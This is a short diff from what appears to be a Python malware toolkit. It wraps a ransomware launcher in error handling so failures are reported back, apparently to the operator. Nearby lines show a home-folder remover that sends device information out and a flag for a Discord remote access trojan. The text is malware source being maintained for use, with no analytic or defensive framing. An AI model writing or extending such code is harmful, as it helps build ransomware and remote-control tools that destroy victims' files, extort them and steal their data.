@@ -326,9 +326,12 @@ class remove_homefold():
             send_device_information(e, 'Home Remover')
 
 if cc.get_ransomware():
-    app = PyQt5.QtWidgets.QApplication(sys.argv) 
-    l = Rose()
-    sys.exit(app.exec())
+    try:
+        app = PyQt5.QtWidgets.QApplication(sys.argv) 
+        l = Rose()
+        sys.exit(app.exec())
+    except Exception as e:
+        send_error_notification(e, 'Ransomware')
 
 if cc.get_knight_discord_rat():
     try:
